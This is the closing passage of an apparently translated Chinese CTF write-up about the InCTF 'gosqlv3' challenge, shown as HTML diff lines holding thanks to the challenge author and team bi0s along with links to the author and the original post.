+<p>最后，我要感谢<a href="https://twitter.com/TarunkantG" target="_blank">Tarunkant</a>（aka SpyD3r）的支持，因为我喜欢挑战的每一部分并学到了很多东西！同时也要感谢<a href="https://twitter.com/teambi0s" target="_blank">teambi0</a>的CTF。</p>
+<p>希望您喜欢它，或者至少学到了一些东西！</p>
+<p><a href="https://0xdf.gitlab.io/2020/05/12/ngrok-ftw.html" target="_blank">Jorge</a></p>
+<p>原文地址：<a href="https://jorgectf.gitlab.io/post/inctf-gosqlv3/" target="_blank">https://jorgectf.gitlab.io/post/inctf-gosqlv3/</a></p>
+</div>
+</div>
